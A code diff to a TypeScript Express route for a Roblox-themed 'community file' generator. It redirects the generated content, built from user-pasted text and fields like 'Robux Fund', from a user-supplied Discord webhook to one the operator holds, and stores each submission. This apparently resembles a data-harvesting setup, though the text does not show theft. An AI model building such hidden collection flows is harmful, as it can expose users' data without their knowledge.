@@ -12,28 +12,31 @@ export async function registerRoutes(app: Express): Promise<Server> {
       
       // Generate community file content
       const generatedContent = generateCommunityFile(
-        validatedData.fileContent,
+        validatedData.textContent,
         validatedData
       );
 
+      // Get webhook URL from environment
+      const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
+      if (!webhookUrl) {
+        throw new Error("Discord webhook URL not configured");
+      }
+
       // Send to Discord webhook
       await sendToDiscordWebhook(
-        validatedData.discordWebhook,
+        webhookUrl,
         generatedContent,
-        validatedData.fileName,
         validatedData.rename
       );
 
       // Store in database
       const community = await storage.createCommunity({
         rename: validatedData.rename,
-        robloxFriend: validatedData.robloxFriend,
+        robuxFund: validatedData.robuxFund,
         communitiesMember: validatedData.communitiesMember,
         ownerUsername: validatedData.ownerUsername,
-        originalFileName: validatedData.fileName,
-        originalContent: validatedData.fileContent,
+        originalContent: validatedData.textContent,
         generatedContent: generatedContent,
-        discordWebhook: validatedData.discordWebhook,
       });
 
       res.json({ 
@@ -81,7 +84,7 @@ function generateCommunityFile(
   originalContent: string,
   formData: {
     rename: string;
-    robloxFriend: string;
+    robuxFund: string;
     communitiesMember: string;
     ownerUsername: string;
   }
@@ -90,7 +93,7 @@ function generateCommunityFile(
   
   let generatedContent = `# Community Configuration Generated on ${new Date().toISOString()}\n`;
   generatedContent += `# Rename: ${formData.rename}\n`;
-  generatedContent += `# Roblox Friend: ${formData.robloxFriend}\n`;
+  generatedContent += `# Robux Fund: ${formData.robuxFund}\n`;
   generatedContent += `# Communities Member: ${formData.communitiesMember}\n`;
   generatedContent += `# Owner Username: ${formData.ownerUsername}\n\n`;
   generatedContent += `# Original Communities Data:\n`;
@@ -108,7 +111,6 @@ function generateCommunityFile(
 async function sendToDiscordWebhook(
   webhookUrl: string,
   content: string,
-  originalFileName: string,
   rename: string
 ): Promise<void> {
   const FormData = require('form-data');
@@ -122,7 +124,7 @@ async function sendToDiscordWebhook(
     contentType: 'text/plain'
   });
   
-  form.append('content', `Community file generated: **${rename}**\nOriginal file: ${originalFileName}`);
+  form.append('content', `Community file generated: **${rename}**`);
 
   try {
     const response = await fetch(webhookUrl, {
